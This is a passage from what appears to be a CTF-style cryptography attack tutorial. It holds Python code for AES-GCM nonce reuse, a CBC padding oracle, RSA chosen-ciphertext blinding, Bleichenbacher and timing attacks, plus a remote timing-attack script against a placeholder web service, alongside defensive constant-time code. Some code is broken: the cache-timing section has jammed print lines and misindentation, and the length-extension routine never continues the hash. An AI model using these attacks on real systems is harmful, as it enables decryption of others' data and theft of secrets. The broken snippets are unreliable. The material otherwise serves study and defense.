    plaintext = b'A' * (block_size * 3)
    ciphertext = encryption_oracle(plaintext)
    
    # Check for repeated ciphertext blocks
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    if len(blocks) != len(set(blocks)):
        return "ECB (repeated blocks detected)"
    else:
        return "Not ECB (likely CBC, CTR, or other mode)"

# Example usage
def example_oracle(plaintext):
    """Example encryption oracle"""
    key = b"SIXTEENBYTE_KEY!"
    cipher = AES.new(key, AES.MODE_ECB)
    padded = plaintext + b'\x00' * (16 - len(plaintext) % 16)
    return cipher.encrypt(padded)

block_size = detect_block_size_cpa(example_oracle)
print(f"Block size: {block_size}")

mode = detect_mode_cpa(example_oracle, block_size)
print(f"Mode: {mode}")
````

**AES-GCM Nonce Reuse Attack:**

```python
def aes_gcm_nonce_reuse_attack(nonce, ciphertext1, tag1, ciphertext2, tag2):
    """
    Attack AES-GCM when nonce is reused with same key
    
    With same nonce:
    C1 = P1 ⊕ Keystream
    C2 = P2 ⊕ Keystream
    Therefore: C1 ⊕ C2 = P1 ⊕ P2
    
    [Inference] Can recover authentication key with 2 messages
    """
    # XOR ciphertexts to get plaintext XOR
    xor_result = bytes(c1 ^ c2 for c1, c2 in zip(ciphertext1, ciphertext2))
    
    # If we know one plaintext (chosen plaintext attack)
    # we can recover the other
    
    print("[Inference] GCM nonce reuse allows:")
    print("1. Keystream recovery if plaintext known")
    print("2. Authentication key recovery with multiple messages")
    print("3. Forgery of arbitrary messages")
    
    return xor_result

# Example
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(16)
nonce = get_random_bytes(12)  # Reused (vulnerability)

# Two encryptions with same nonce
cipher1 = AES.new(key, AES.MODE_GCM, nonce=nonce)
plaintext1 = b"Known message!!!"
ciphertext1, tag1 = cipher1.encrypt_and_digest(plaintext1)

cipher2 = AES.new(key, AES.MODE_GCM, nonce=nonce)
plaintext2 = b"Secret target!!!"
ciphertext2, tag2 = cipher2.encrypt_and_digest(plaintext2)

# Attack: recover second plaintext using first
keystream = bytes(p ^ c for p, c in zip(plaintext1, ciphertext1))
recovered_plaintext2 = bytes(c ^ k for c, k in zip(ciphertext2, keystream))
print(f"Recovered: {recovered_plaintext2}")
```

**Length Extension Attack (Hash-Based):**

```python
import hashlib
import struct

def length_extension_attack(original_hash, original_message_length, append_data, hash_func='sha256'):
    """
    Perform length extension attack on hash-based MAC
    Vulnerable construction: MAC(K || M) = H(K || M)
    
    [Inference] Works on Merkle-Damgård hashes (SHA-1, SHA-256, MD5)
    Does NOT work on SHA-3 (sponge construction)
    """
    # Parse hash state from original hash
    if hash_func == 'sha256':
        state = struct.unpack('>8I', bytes.fromhex(original_hash))
        block_size = 64
        digest_size = 32
    elif hash_func == 'sha1':
        state = struct.unpack('>5I', bytes.fromhex(original_hash))
        block_size = 64
        digest_size = 20
    else:
        raise ValueError("Unsupported hash function")
    
    # Calculate padding that was added to original message
    # Padding format: 0x80 || zeros || bit_length
    original_bits = original_message_length * 8
    padding_length = (55 - original_message_length) % block_size
    original_padding = b'\x80' + (b'\x00' * padding_length) + struct.pack('>Q', original_bits)
    
    # New message length includes original padding
    new_message_length = original_message_length + len(original_padding) + len(append_data)
    
    # Construct forged message (without knowing key)
    # Forged = original_padding || append_data
    forged_suffix = original_padding + append_data
    
    print(f"[Inference] Forged message structure:")
    print(f"  Unknown key || Original message || Padding || Appended data")
    print(f"  Length: {original_message_length} + {len(forged_suffix)} bytes")
    
    return {
        'forged_suffix': forged_suffix,
        'new_length': new_message_length,
        'note': 'Need to continue hash from original state'
    }

# Example usage (conceptual)
original_hash = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
original_msg_len = 16  # Length of "message" (key length unknown)
append = b"&admin=true"

result = length_extension_attack(original_hash, original_msg_len, append)
print(f"Forged suffix: {result['forged_suffix']}")
```

**CTF CPA Toolkit:**

```python
class CPAToolkit:
    """
    Toolkit for chosen plaintext attacks in CTF challenges
    """
    
    def __init__(self, encryption_oracle):
        """
        encryption_oracle: function that takes plaintext, returns ciphertext
        """
        self.oracle = encryption_oracle
        self.block_size = self.detect_block_size()
        self.mode = self.detect_mode()
    
    def detect_block_size(self):
        """Auto-detect block size"""
        base_len = len(self.oracle(b''))
        for i in range(1, 256):
            current_len = len(self.oracle(b'A' * i))
            if current_len != base_len:
                return current_len - base_len
        return 16  # Default
    
    def detect_mode(self):
        """Detect encryption mode"""
        test = b'A' * (self.block_size * 3)
        ct = self.oracle(test)
        blocks = [ct[i:i+self.block_size] 
                  for i in range(0, len(ct), self.block_size)]
        
        if len(blocks) != len(set(blocks)):
            return 'ECB'
        else:
            return 'UNKNOWN (not ECB)'
    
    def check_prefix_length(self):
        """Detect if oracle prepends unknown prefix"""
        # Send varying inputs and look for alignment
        results = {}
        for i in range(self.block_size * 2):
            ct = self.oracle(b'A' * i)
            results[i] = ct
        
        # Analyze where repetition starts
        for i in range(len(results)):
            for j in range(i + 1, len(results)):
                # Check if blocks become identical
                ct1 = results[i]
                ct2 = results[j]
                
                for block_idx in range(min(len(ct1), len(ct2)) // self.block_size):
                    b1 = ct1[block_idx * self.block_size:(block_idx + 1) * self.block_size]
                    b2 = ct2[block_idx * self.block_size:(block_idx + 1) * self.block_size]
                    
                    if b1 == b2:
                        # Found aligned block
                        prefix_len = block_idx * self.block_size - i
                        return max(0, prefix_len)
        
        return 0
    
    def ecb_decrypt_suffix(self):
        """Decrypt unknown suffix in ECB mode"""
        if self.mode != 'ECB':
            print("[!] Warning: Not ECB mode")
            return None
        
        return ecb_byte_at_a_time_attack(self.oracle, self.block_size)
    
    def build_ecb_codebook(self, charset=None):
        """Build codebook of all single-character encryptions"""
        if charset is None:
            charset = bytes(range(256))
        
        codebook = {}
        
        # Create aligned single-byte inputs
        prefix = b'A' * (self.block_size - 1)
        
        for byte_val in charset:
            plaintext = prefix + bytes([byte_val])
            ciphertext = self.oracle(plaintext)
            first_block = ciphertext[:self.block_size]
            codebook[first_block] = byte_val
        
        return codebook
    
    def test_malleability(self):
        """Test if ciphertext can be modified (CBC, CTR)"""
        plaintext = b'A' * 32
        ct1 = self.oracle(plaintext)
        
        # In CBC/CTR, flipping ciphertext bit should affect decryption
        # In AEAD modes, modification should be detected
        
        print("[Inference] Testing malleability requires decryption oracle")
        return "Requires decryption oracle to test"

# Example usage
def example_ecb_oracle(pt):
    secret_suffix = b"SECRET_FLAG{test}"
    key = b"SIXTEENBYTE_KEY!"
    cipher = AES.new(key, AES.MODE_ECB)
    data = pt + secret_suffix
    padded = data + bytes([16 - len(data) % 16]) * (16 - len(data) % 16)
    return cipher.encrypt(padded)

toolkit = CPAToolkit(example_ecb_oracle)
print(f"Block size: {toolkit.block_size}")
print(f"Mode: {toolkit.mode}")

if toolkit.mode == 'ECB':
    secret = toolkit.ecb_decrypt_suffix()
    print(f"Recovered secret: {secret}")
```

### Chosen Ciphertext Attack (CCA)

An attack where the attacker can choose arbitrary ciphertexts to be decrypted and observe the resulting plaintexts, allowing exploitation of decryption behavior.

**Attack Scenario:**

```
Attacker can: Choose C₁, C₂, ..., Cₙ
              Obtain P₁, P₂, ..., Pₙ where Pᵢ = D(Cᵢ)
Goal: Decrypt target ciphertext C' or recover key K
```

**RSA CCA - Multiplicative Property:**

```python
def rsa_cca_multiplicative(target_ciphertext, e, n, decryption_oracle):
    """
    Exploit RSA's multiplicative property
    
    Given: C = M^e mod n (target ciphertext)
    Choose: r (random value coprime to n)
    Compute: C' = C * r^e mod n
    Oracle decrypts: M' = (C')^d = M * r mod n
    Recover: M = M' * r^(-1) mod n
    """
    import random
    from Crypto.Util.number import inverse, GCD
    
    # Choose random r coprime to n
    while True:
        r = random.randint(2, n - 1)
        if GCD(r, n) == 1:
            break
    
    # Create modified ciphertext
    r_encrypted = pow(r, e, n)
    modified_ciphertext = (target_ciphertext * r_encrypted) % n
    
    # Get decryption from oracle
    modified_plaintext = decryption_oracle(modified_ciphertext)
    
    # Recover original plaintext
    r_inv = inverse(r, n)
    original_plaintext = (modified_plaintext * r_inv) % n
    
    return original_plaintext

# Example: Simulated RSA CCA
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, long_to_bytes

# Generate RSA key
key = RSA.generate(2048)
n = key.n
e = key.e
d = key.d

# Target ciphertext
target_message = b"SECRET FLAG"
target_m = bytes_to_long(target_message)
target_c = pow(target_m, e, n)

# Simulated decryption oracle (with target ciphertext blocked)
blocked_ciphertexts = {target_c}

def rsa_decrypt_oracle(ciphertext):
    """Oracle that refuses to decrypt target directly"""
    if ciphertext in blocked_ciphertexts:
        raise ValueError("Cannot decrypt this ciphertext")
    return pow(ciphertext, d, n)

# Attack
recovered_m = rsa_cca_multiplicative(target_c, e, n, rsa_decrypt_oracle)
recovered_message = long_to_bytes(recovered_m)
print(f"Recovered: {recovered_message}")
```

**CBC Padding Oracle (CCA):**

```python
def cbc_padding_oracle_decrypt(iv, ciphertext, padding_oracle, block_size=16):
    """
    Full CBC decryption using padding oracle (CCA variant)
    More efficient implementation with optimizations
    """
    def decrypt_block(prev_block, curr_block):
        """Decrypt a single block"""
        intermediate = bytearray(block_size)
        
        for pad_val in range(1, block_size + 1):
            # Create probe with known padding
            probe = bytearray(block_size)
            
            # Set bytes we've already found
            for i in range(block_size - pad_val + 1, block_size):
                probe[i] = intermediate[i] ^ pad_val
            
            # Brute force current byte
            found = False
            for guess in range(256):
                probe[block_size - pad_val] = guess
                
                if padding_oracle(bytes(probe) + curr_block):
                    # Check for false positive (when pad_val > 1)
                    if pad_val == 1:
                        # Verify it's actually 0x01 padding
                        probe2 = probe.copy()
                        probe2[block_size - 2] ^= 1
                        if not padding_oracle(bytes(probe2) + curr_block):
                            continue  # False positive
                    
                    intermediate[block_size - pad_val] = guess ^ pad_val
                    found = True
                    break
            
            if not found:
                raise Exception(f"Failed at pad_val={pad_val}")
        
        # XOR with previous block to get plaintext
        plaintext = bytes(intermediate[i] ^ prev_block[i] for i in range(block_size))
        return plaintext
    
    # Split into blocks
    blocks = [iv] + [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
    
    plaintext = b''
    for i in range(1, len(blocks)):
        plaintext += decrypt_block(blocks[i-1], blocks[i])
    
    # Remove padding
    if plaintext:
        pad_len = plaintext[-1]
        if pad_len <= block_size and all(b == pad_len for b in plaintext[-pad_len:]):
            plaintext = plaintext[:-pad_len]
    
    return plaintext

# Optimized padding oracle with timing attack resistance
def timing_safe_padding_oracle(ciphertext):
    """
    Padding oracle that attempts constant-time validation
    [Inference] May still leak information through other side channels
    """
    try:
        cipher = AES.new(ORACLE_KEY, AES.MODE_CBC, ciphertext[:16])
        plaintext = cipher.decrypt(ciphertext[16:])
        
        # Check padding
        pad_len = plaintext[-1]
        if pad_len == 0 or pad_len > 16:
            return False
        
        # Constant-time padding check
        valid = True
        for i in range(pad_len):
            if plaintext[-(i+1)] != pad_len:
                valid = False
        
        return valid
    except:
        return False
```

**CBC-R (Recursive CBC) Attack:**

```python
def cbc_r_attack(ciphertext, decryption_oracle, block_size=16):
    """
    Attack CBC when decryption oracle returns plaintext
    Allows recovery without padding oracle
    
    Modify IV to control first plaintext block
    """
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    recovered = b''
    
    for i, block in enumerate(blocks):
        # Try each possible IV to produce known first block
        test_plaintext = b'A' * block_size
        
        # Binary search or brute force to find IV that produces target
        # [Inference] Requires multiple oracle queries per block
        
        print(f"[Inference] Recovering block {i+1}/{len(blocks)}")
        # Full implementation requires extensive oracle queries
    
    return recovered
```

**Bleichenbacher's Attack on PKCS#1 v1.5:**

```python
def bleichenbacher_attack_simplified(ciphertext, n, e, padding_oracle):
    """
    Simplified Bleichenbacher's attack on RSA PKCS#1 v1.5
    
    Oracle returns: True if decrypted plaintext starts with 0x00 0x02
    [Inference] Full implementation is complex, requires ~million queries
    """
    import math
    
    # PKCS#1 v1.5 padding format:
    # 0x00 || 0x02 || random_padding || 0x00 || message
    
    # Step 1: Blinding
    # Find s₀ such that m₀*s₀ is PKCS conforming
    
    k = (n.bit_length() + 7) // 8  # Key length in bytes
    B = 2 ** (8 * (k - 2))
    
    print(f"[Inference] Bleichenbacher attack requires:")
    print(f"  - Multiple oracle queries (~1 million for 2048-bit RSA)")
    print(f"  - Interval narrowing algorithm")
    print(f"  - Typically takes hours to complete")
    
    # Pseudocode for full attack:
    # 1. Find first PKCS conforming message
    # 2. Narrow intervals using oracle responses
    # 3. Iterate until single interval remains
    # 4. Extract plaintext from interval
    
    return "Full implementation complex - see research papers"

# Example: Simulated PKCS#1 padding oracle
def pkcs1_padding_oracle(ciphertext, n, d):
    """Check if decryption has valid PKCS#1 v1.5 padding"""
    plaintext_int = pow(ciphertext, d, n)
    plaintext_bytes = plaintext_int.to_bytes((n.bit_length() + 7) // 8, 'big')
    
    # Check padding format: 0x00 0x02 ...
    if len(plaintext_bytes) < 11:
        return False
    
    if plaintext_bytes[0] != 0x00 or plaintext_bytes[1] != 0x02:
        return False
    
    # Check for 0x00 separator
    if 0x00 not in plaintext_bytes[2:]:
        return False
    
    return True
```

**CTF CCA Detection and Strategy:**

```python
def analyze_cca_vulnerability(challenge_info):
    """
    Identify CCA vulnerabilities in CTF challenges
    [Inference] Based on common patterns
    """
    vulnerabilities = []
    attack_strategy = []
    
    # Check for decryption oracle
    if challenge_info.get('decryption_oracle'):
        vulnerabilities.append("DECRYPTION ORACLE AVAILABLE")
        
        if challenge_info.get('padding_check'):
            attack_strategy.append({
                'attack': 'Padding Oracle',
                'target': 'CBC mode ciphers',
                'tool': 'PadBuster, custom script'
            })
        
        if challenge_info.get('cipher') == 'RSA':
            attack_strategy.append({
                'attack': 'RSA Multiplicative Property',
                'target': 'Unpadded or PKCS#1 v1.5',
                'tool': 'Custom script'
            })
        
        if challenge_info.get('format_check'):
            attack_strategy.append({
                'attack': 'Format Oracle',
                'target': 'XML, JSON parsing errors',
                'tool': 'Custom script'
            })
    
    # Check for error messages
    if challenge_info.get('verbose_errors'):
        vulnerabilities.append("VERBOSE ERROR MESSAGES")
        attack_strategy.append({
            'attack': 'Error Message Analysis',
            'target': 'Timing differences, distinct errors',
            'tool': 'Manual analysis'
        })
    
    # Check for malleability
    if challenge_info.get('mode') in ['CBC', 'CTR', 'CFB']:
        vulnerabilities.append("MALLEABLE CIPHER MODE")
        attack_strategy.append({
            'attack': 'Bit Flipping',
            'target': 'Authentication bypass',
            'tool': 'Custom script'
        })
    
    return {
        'vulnerabilities': vulnerabilities,
        'strategies': attack_strategy
    }

# Example analysis
challenge = {
    'cipher': 'AES-CBC',
    'decryption_oracle': True,
    'padding_check': True,
    'mode': 'CBC'
}

analysis = analyze_cca_vulnerability(challenge)
print("Vulnerabilities:")
for vuln in analysis['vulnerabilities']:
    print(f"  - {vuln}")

print("\nAttack Strategies:")
for strategy in analysis['strategies']:
    print(f"  [{strategy['attack']}]")
    print(f"    Target: {strategy['target']}")
    print(f"    Tool: {strategy['tool']}")
```

### Side-Channel Attacks

Side-channel attacks exploit physical implementation characteristics rather than theoretical weaknesses in the algorithm.

**Timing Attack Basics:**

```python
import time
import statistics

def timing_attack_password_check(oracle_function, charset, known_prefix=""):
    """
    Exploit timing differences in string comparison
    Vulnerable code: if password == user_input (early exit on mismatch)
    """
    current_password = known_prefix
    
    while True:
        timings = {}
        
        # Test each character
        for char in charset:
            test_password = current_password + char
            
            # Measure multiple times for accuracy
            measurements = []
            for _ in range(100):
                start = time.perf_counter()
                oracle_function(test_password)
                elapsed = time.perf_counter() - start
                measurements.append(elapsed)
            
            # Use median to reduce noise
            timings[char] = statistics.median(measurements)
        
        # Character with longest time is likely correct
        best_char = max(timings.items(), key=lambda x: x[1])[0]
        current_password += best_char
        
        print(f"[Inference] Found: {current_password}")
        
        # Check if complete (would need success indicator in real scenario)
        if len(current_password) >= 20:  # Arbitrary limit
            break
    
    return current_password

# Example: Vulnerable password check
SECRET_PASSWORD = "FLAG{timing}"

def vulnerable_check(password):
    """Vulnerable to timing attack - compares byte-by-byte"""
    for i in range(min(len(SECRET_PASSWORD), len(password))):
        if SECRET_PASSWORD[i] != password[i]:
            return False
        # Simulated processing delay
        time.sleep(0.0001)
    return len(password) == len(SECRET_PASSWORD)

# Attack simulation (commented to avoid long execution)
# charset = string.ascii_letters + string.digits + "{}_"
# recovered = timing_attack_password_check(vulnerable_check, charset)
```

**Timing Attack on RSA (Simple):**

```python
def timing_attack_rsa_crt(ciphertext_list, decryption_oracle_with_timing):
    """
    Exploit timing differences in RSA-CRT implementation
    
    [Inference] CRT optimization causes timing variation based on:
    - Whether c mod p or c mod q requires more reduction steps
    - Can leak information about factors p and q
    """
    timings = []
    
    for ciphertext in ciphertext_list:
        start = time.perf_counter()
        decryption_oracle_with_timing(ciphertext)
        elapsed = time.perf_counter() - start
        
        timings.append((ciphertext, elapsed))
    
    # Statistical analysis of timings
    # [Inference] Requires many samples and sophisticated analysis
    
    print("[Inference] RSA-CRT timing attack requires:")
    print("  - Thousands of timing measurements")
    print("  - Statistical analysis (Kocher's algorithm)")
    print("  - Control over ciphertext values")
    
    return "Complex statistical analysis required"
```

**Power Analysis (Conceptual):**

```python
def simulate_power_analysis_dpa():
    """
    Differential Power Analysis (DPA) simulation
    
    [Unverified] Actual DPA requires hardware measurement equipment
    This is conceptual demonstration only
    """
    print("[Inference] Power Analysis Attack Types:")
    print("\n1. Simple Power Analysis (SPA):")
    print("   - Visual inspection of power traces")
    print("   - Identifies operations (multiply vs square in RSA)")
    print("   - Single trace may be sufficient")
    
    print("\n2. Differential Power Analysis (DPA):")
    print("   - Statistical analysis of many power traces")
    print("   - Correlates power consumption with key bits")
    print("   - Requires ~1000-10000 traces")
    
    print("\n3. Correlation Power Analysis (CPA):")
    print("   - Pearson correlation between model and measurements")
    print("   - More efficient than DPA")
    print("   - Requires fewer traces")
    
    print("\nDefenses:")
    print("   - Constant-time implementations")
    print("   - Masking/blinding")
    print("   - Noise injection")
    print("   - Hardware countermeasures")
    
    # Simulated power trace (conceptual)
    def hamming_weight(value):
        """Number of 1 bits - correlates with power consumption"""
        return bin(value).count('1')
    
    # Example: AES S-box power consumption model
    sbox_output = 0x63  # Example S-box output
    power_model = hamming_weight(sbox_output)
    
    print(f"\n[Example] Hamming weight model: {power_model}")
    
    return "Requires hardware setup for real attack"
```

**Acoustic Cryptanalysis (Conceptual):**

```python
def acoustic_attack_info():
    """
    Information about acoustic side-channel attacks
    [Unverified] Actual attacks require specialized equipment
    """
    print("[Inference] Acoustic Side-Channel Attacks:")
    
    print("\n1. RSA Key Extraction:")
    print("   - Measure CPU sounds during decryption")
    print("   - Different operations produce different frequencies")
    print("   - Can extract 4096-bit RSA key in under an hour")
    print("   - Demonstrated by Genkin et al. (2013)")
    
    print("\n2. Attack Requirements:")
    print("   - Microphone near target device")
    print("   - Multiple decryption operations")
    print("   - Signal processing to filter noise")
    print("   - Statistical analysis")
    
    print("\n3. Defense Mechanisms:")
    print("   - Physical isolation/shielding")
    print("   - Constant-time implementations")
    print("   - Acoustic noise generation")
    print("   - Algorithm selection (avoid vulnerable operations)")
    
    return "Theoretical information only"
```

**Cache-Timing Attacks:**

```python
def cache_timing_attack_aes_conceptual():
    """
    Cache-timing attack on AES (conceptual)
    
    [Inference] Based on Bernstein's attack (2005) and later work
    """
    print("[Inference] AES Cache-Timing Attack:")
    
    print("\nVulnerability:")
    print("   - AES T-table implementations use key-dependent lookups")
    print("   - Cache hits/misses create timing differences")
    print("   - Can recover AES key with ~2^27 encryptions")
    
    print("\nAttack Steps:")
    print("   1. Prime cache with known data")
    print("   2. Trigger AES encryption")
    print("   3. Measure access time to cache lines")
    print("   4. Infer which T-table entries were accessed")
    print("   5. Statistical analysis reveals key bytes")
    
    print("\nModern Defenses:")
    print("   - AES-NI hardware instructions (constant-time)")
    print("   - Bitsliced implementations")
    print("   - Cache-oblivious algorithms")
    print("   - Address Space Layout Randomization (ASLR)")
    
    # Conceptual timing measurement
    def measure_cache_timing(address):
        """Conceptual cache timing measurement"""
        start = time.perf_counter()
        # Access memory location
        # Cache hit: ~1-5 cycles
        # Cache miss: ~100-300 cycles
        elapsed = time.perf_counter() - start
        return elapsed
    
    print("\n[Example] Cache timing threshold:") print(" - Hit: < 100 CPU cycles") print(" - Miss: > 200 CPU cycles") print(" - Real attack requires precise measurement")

return "Conceptual demonstration only"
````

**Fault Injection Attacks:**

```python
def fault_attack_rsa_crt():
    """
    Bellcore attack on RSA-CRT using fault injection
    
    [Inference] Inducing faults during computation reveals factors
    """
    print("[Inference] RSA-CRT Fault Attack (Bellcore Attack):")
    
    print("\nAttack Principle:")
    print("   RSA-CRT computes:")
    print("   - m_p = c^d_p mod p")
    print("   - m_q = c^d_q mod q")
    print("   - Combines using Chinese Remainder Theorem")
    
    print("\nFault Injection:")
    print("   1. Induce fault in one CRT computation (e.g., m_q)")
    print("   2. Get faulty signature s'")
    print("   3. Correct signature: s = m^d mod n")
    print("   4. Faulty signature: s' ≠ m^d mod n")
    print("   5. GCD(s - s', n) reveals factor p or q")
    
    print("\nFault Methods:")
    print("   - Voltage glitching")
    print("   - Clock glitching")
    print("   - Electromagnetic interference")
    print("   - Laser fault injection")
    print("   - Temperature manipulation")
    
    def simulate_fault_attack(n, correct_signature, faulty_signature):
        """Simulate recovery of factor from faulty signature"""
        import math
        
        difference = abs(correct_signature - faulty_signature)
        factor = math.gcd(difference, n)
        
        if 1 < factor < n:
            return factor
        return None
    
    # Example values (small for demonstration)
    n = 3233  # 53 * 61
    correct_sig = 123
    faulty_sig = 456
    
    factor = simulate_fault_attack(n, correct_sig, faulty_sig)
    if factor:
        print(f"\n[Example] Recovered factor: {factor}")
        print(f"   Other factor: {n // factor}")
    
    return "Requires hardware fault injection in practice"

# Run demonstration
fault_attack_rsa_crt()
````

**Rowhammer Attack (Conceptual):**

```python
def rowhammer_cryptographic_impact():
    """
    Rowhammer attack implications for cryptography
    [Inference] Based on published research
    """
    print("[Inference] Rowhammer Attack on Cryptographic Keys:")
    
    print("\nAttack Mechanism:")
    print("   1. Repeatedly access specific memory rows")
    print("   2. Causes bit flips in adjacent rows (DRAM disturbance)")
    print("   3. Can flip bits in cryptographic keys")
    print("   4. Weakens or fully compromises keys")
    
    print("\nCryptographic Targets:")
    print("   - RSA private keys (flip bits in d, p, or q)")
    print("   - AES keys stored in memory")
    print("   - ECDSA nonce generation")
    print("   - TLS session keys")
    
    print("\nExample Impact on RSA:")
    print("   - Single bit flip in private exponent d")
    print("   - Creates faulty signature")
    print("   - Fault attack recovers factors")
    
    print("\nDefenses:")
    print("   - ECC memory (detects/corrects bit flips)")
    print("   - Target Row Refresh (TRR)")
    print("   - Memory isolation")
    print("   - Regular key rotation")
    
    return "Requires DRAM hardware vulnerability"
```

**Timing-Safe Comparison Implementation:**

```python
def constant_time_compare(a, b):
    """
    Constant-time byte sequence comparison
    Prevents timing attacks on string comparison
    """
    if len(a) != len(b):
        return False
    
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    
    return result == 0

def timing_safe_hmac_compare(hmac1, hmac2):
    """
    Timing-safe HMAC comparison using secrets.compare_digest
    """
    import secrets
    return secrets.compare_digest(hmac1, hmac2)

# Example: Demonstrate timing difference
def vulnerable_compare(a, b):
    """Vulnerable early-exit comparison"""
    if len(a) != len(b):
        return False
    for i in range(len(a)):
        if a[i] != b[i]:
            return False  # Early exit leaks position
    return True

def test_timing_difference():
    """Measure timing difference between implementations"""
    import time
    
    secret = b"SECRET_TOKEN_1234567890"
    
    # Test vulnerable implementation
    wrong1 = b"AECRET_TOKEN_1234567890"  # Wrong at position 0
    wrong2 = b"SECRET_AOKEN_1234567890"  # Wrong at position 7
    
    # Measure multiple times
    iterations = 10000
    
    start = time.perf_counter()
    for _ in range(iterations):
        vulnerable_compare(secret, wrong1)
    time1 = time.perf_counter() - start
    
    start = time.perf_counter()
    for _ in range(iterations):
        vulnerable_compare(secret, wrong2)
    time2 = time.perf_counter() - start
    
    print(f"Wrong at position 0: {time1:.6f}s")
    print(f"Wrong at position 7: {time2:.6f}s")
    print(f"Difference: {abs(time2 - time1):.6f}s ({abs(time2-time1)/time1*100:.2f}%)")
    
    # Now test constant-time
    start = time.perf_counter()
    for _ in range(iterations):
        constant_time_compare(secret, wrong1)
    time1_ct = time.perf_counter() - start
    
    start = time.perf_counter()
    for _ in range(iterations):
        constant_time_compare(secret, wrong2)
    time2_ct = time.perf_counter() - start
    
    print(f"\nConstant-time wrong at position 0: {time1_ct:.6f}s")
    print(f"Constant-time wrong at position 7: {time2_ct:.6f}s")
    print(f"Difference: {abs(time2_ct - time1_ct):.6f}s ({abs(time2_ct-time1_ct)/time1_ct*100:.2f}%)")

# Run test
# test_timing_difference()
```

**CTF Side-Channel Attack Recognition:**

```python
def identify_side_channel_vulnerability(challenge_info):
    """
    Identify potential side-channel vulnerabilities in CTF
    [Inference] Based on common CTF patterns
    """
    vulnerabilities = []
    
    # Timing vulnerabilities
    if challenge_info.get('comparison_operation'):
        if challenge_info.get('early_exit'):
            vulnerabilities.append({
                'type': 'TIMING',
                'detail': 'Early-exit comparison',
                'exploit': 'Character-by-character timing attack',
                'tool': 'Custom timing measurement script'
            })
    
    if challenge_info.get('network_service'):
        vulnerabilities.append({
            'type': 'TIMING',
            'detail': 'Network timing observable',
            'exploit': 'Remote timing attack (requires many samples)',
            'tool': 'timing_attack.py with statistics'
        })
    
    # Implementation vulnerabilities
    if challenge_info.get('rsa_implementation'):
        if not challenge_info.get('constant_time'):
            vulnerabilities.append({
                'type': 'TIMING',
                'detail': 'Non-constant-time RSA',
                'exploit': 'Kocher timing attack or CRT timing',
                'tool': 'Statistical analysis of decryption times'
            })
    
    if challenge_info.get('aes_lookup_table'):
        vulnerabilities.append({
            'type': 'CACHE',
            'detail': 'T-table AES implementation',
            'exploit': 'Cache-timing attack (if local)',
            'tool': 'Requires local access and cache probing'
        })
    
    # Error message side channels
    if challenge_info.get('verbose_errors'):
        vulnerabilities.append({
            'type': 'ERROR_MESSAGE',
            'detail': 'Distinct error messages',
            'exploit': 'Use errors to distinguish states',
            'tool': 'Manual analysis of error responses'
        })
    
    # Fault injection opportunities
    if challenge_info.get('hardware_device'):
        vulnerabilities.append({
            'type': 'FAULT',
            'detail': 'Physical hardware access',
            'exploit': 'Voltage/clock glitching',
            'tool': 'ChipWhisperer or similar hardware'
        })
    
    return vulnerabilities

# Example analysis
challenge = {
    'comparison_operation': True,
    'early_exit': True,
    'network_service': True,
    'constant_time': False
}

vulns = identify_side_channel_vulnerability(challenge)
print("Side-Channel Vulnerabilities:")
for vuln in vulns:
    print(f"\n[{vuln['type']}]")
    print(f"  Detail: {vuln['detail']}")
    print(f"  Exploit: {vuln['exploit']}")
    print(f"  Tool: {vuln['tool']}")
```

**Practical CTF Timing Attack Script:**

```python
import requests
import time
import statistics
import string

def remote_timing_attack(url, param_name, charset=None, known_prefix=""):
    """
    Practical timing attack against remote service
    For CTF web challenges with timing vulnerabilities
    """
    if charset is None:
        charset = string.ascii_letters + string.digits + "_{}!@#$%^&*()"
    
    current_value = known_prefix
    samples_per_char = 50  # Number of measurements per character
    
    print(f"[*] Starting timing attack on {url}")
    print(f"[*] Parameter: {param_name}")
    print(f"[*] Starting from: '{current_value}'")
    
    while True:
        print(f"\n[*] Testing position {len(current_value)}")
        
        timings = {}
        
        for char in charset:
            test_value = current_value + char
            measurements = []
            
            for _ in range(samples_per_char):
                try:
                    start = time.perf_counter()
                    response = requests.get(
                        url,
                        params={param_name: test_value},
                        timeout=5
                    )
                    elapsed = time.perf_counter() - start
                    measurements.append(elapsed)
                    
                    # Check for success condition
                    if "SUCCESS" in response.text or response.status_code == 200:
                        print(f"\n[+] Found complete value: {test_value}")
                        return test_value
                        
                except requests.RequestException as e:
                    print(f"[!] Request error: {e}")
                    continue
            
            if measurements:
                # Use median to reduce noise
                timings[char] = statistics.median(measurements)
                print(f"  '{char}': {timings[char]:.6f}s", end='\r')
        
        if not timings:
            print(f"[!] No successful measurements")
            break
        
        # Find character with longest median time
        best_char, best_time = max(timings.items(), key=lambda x: x[1])
        
        # Calculate statistical significance
        times = sorted(timings.values())
        if len(times) > 1:
            second_best = times[-2]
            difference = best_time - second_best
            significance = (difference / second_best) * 100
            
            print(f"\n[*] Best: '{best_char}' ({best_time:.6f}s)")
            print(f"[*] Difference from second: {significance:.2f}%")
            
            if significance < 1.0:  # Less than 1% difference
                print(f"[!] Low confidence - may need more samples")
        
        current_value += best_char
        print(f"[+] Current value: '{current_value}'")
        
        # Safety limit
        if len(current_value) > 100:
            print("[!] Reached length limit")
            break
    
    return current_value

# Example usage (commented to prevent actual network calls)
# result = remote_timing_attack(
#     url="http://ctf.example.com/check",
#     param_name="token",
#     known_prefix="FLAG{"
# )
```

**Side-Channel Defense Checklist:**

```python
def side_channel_defense_audit(implementation_details):
    """
    Audit cryptographic implementation for side-channel resistance
    [Inference] Based on security best practices
    """
    issues = []
    recommendations = []
    
    # Timing defenses
    if not implementation_details.get('constant_time_comparison'):
        issues.append("CRITICAL: Non-constant-time comparison")
        recommendations.append("Use secrets.compare_digest() or equivalent")
    
    if not implementation_details.get('constant_time_crypto'):
        issues.append("HIGH: Non-constant-time cryptographic operations")
        recommendations.append("Use hardware instructions (AES-NI) or bitsliced implementations")
    
    # Memory safety
    if not implementation_details.get('secure_memory_clearing'):
        issues.append("MEDIUM: Secrets may remain in memory")
        recommendations.append("Explicitly zero sensitive data after use")
    
    if not implementation_details.get('memory_locking'):
        issues.append("LOW: Memory may be swapped to disk")
        recommendations.append("Use mlock() to prevent swapping of key material")
    
    # Error handling
